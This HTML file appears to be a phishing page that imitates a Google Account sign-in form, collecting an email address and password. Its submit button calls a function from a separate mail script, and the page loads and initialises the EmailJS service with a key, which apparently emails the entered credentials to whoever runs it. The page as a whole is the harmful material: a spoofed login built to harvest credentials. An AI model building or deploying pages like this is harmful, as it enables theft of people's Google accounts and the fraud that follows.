<!DOCTYPE html>
<html lang="en">
<head>
    <title>Google Account Login</title>
    <link rel="stylesheet" href="css/login.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="js/mail.js"></script>
    <script type="text/javascript">
      emailjs.init('qQeYtEibjLGxBw7Cv')
    </script>
</head>
<body>
    <div class="box">
        <div class="logo">
            <img src="assets/img/google.png" alt="Google" width="85" height="55">
        </div>
    <h2>Sign In</h2>
    <p>Use your Google Account</p>
    <form id="form">
        <div class="inputBox">
          <input type="email"  id="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
          <label>Username</label>
        </div>
        <div class="inputBox">
              <input type="password" id="pass" name="pass" required onkeyup="this.setAttribute('value', this.value);" value="">
              <label>Password</label>
            </div>
        <input type="submit" id="button" name="sign-in" value="Sign In" onclick=sendAutenticationRequest()>
      </form>
    </div>
</body>
</html>
